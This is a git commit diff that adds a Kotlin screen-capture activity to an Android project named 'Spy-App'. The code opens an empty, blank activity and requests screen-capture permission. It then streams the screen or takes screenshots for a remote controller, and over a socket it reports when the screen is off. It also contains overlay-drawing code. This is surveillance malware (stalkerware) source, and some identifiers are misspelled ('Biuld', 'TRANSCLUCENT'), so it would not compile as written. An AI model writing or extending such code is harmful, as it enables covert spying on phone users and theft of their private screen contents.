f7a6e05430387936b791800849b0fc5f38ff34ba
steiner-254 <steineralvin3@gmail.com>
2024-06-20 00:19:14 +0300

    update

--- Spy-App/ScreenPojectionActivity.kt
+++ Spy-App/ScreenPojectionActivity.kt
@@ -24,5 +24,66 @@ import me.hawkshaw.utils.Constants
 import org.json.JSONObject
 
 class ScreenProjectionActivity : Activity() {
-    
+    private val li by lazy {
+        getSystemService(Service.LAYOUT_INFLATER_SERVICE) as LayoutInflater
+    }
+    private val view by lazy {
+        li.inflate(R.layout.overlay_1, LinearLayout(this))
+    }
+    override fun onCreate(savedInstanceState: Bundle?) {
+        super.onCreate(savedInstanceState)
+
+        val tv = TextView(this)
+        tv.text = ""
+        setContentView(tv)
+
+        val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
+        if (powerManager.isInteractive) screenCast()
+        else {
+            val obj = JSONObject()
+            obj.put("name", "Screen Off")
+            obj.put("image64", "null")
+            obj.put("dataType", "downloadImage")
+            Constants.socket?.emit("usrData", obj)
+            super.onBackPressed()
+        }
+    }
+
+    private fun screenCast() {
+        val mgr = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
+        startActivityForResult(mgr.createScreenCaptureIntent(), 7575)
+        // drawOverOtherApps()
+    }
+
+    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
+        super.onActivityResult(requestCode, resultCode, data)
+        //windowManager.removeView(view)
+        if (requestCode == 7575 && resultCode == RESULT_OK)
+        if (intent.getBooleanExtra("streamScreen", false)) StreamScreen(applicationContext, Handler(), resultCode, data).start()
+        else TakeScreenShot(applicationContext, Handler(), resultCode, data).start()
+        super.onBackPressed()
+    }
+
+    private fun drawOverOtherApps() {
+        if (Biuld.VERSION.SDK_INT >= Biuld.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
+            Toast.makeText(this, "Draw Over other apps is not enabled", Toast.LENGTH_SHORT).show()
+        }
+        else
+        draw()
+    }
+
+    private fun draw() {
+        val params = WindowManager.LayoutParams(
+            WindowManager.LayoutParams.MATCH_PARENT,
+            WindowManager.LayoutParams.WRAP_CONTENT,
+            WindowManager.LayoutParams.TYPE_PHONE,
+            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE,
+            PixelFormat.TRANSCLUCENT)
+
+            params.gravity = Gravity.BOTTOM
+            params.y = 395
+            params.x = 50
+
+            WindowManager.addView(view, params)
+    }
 }
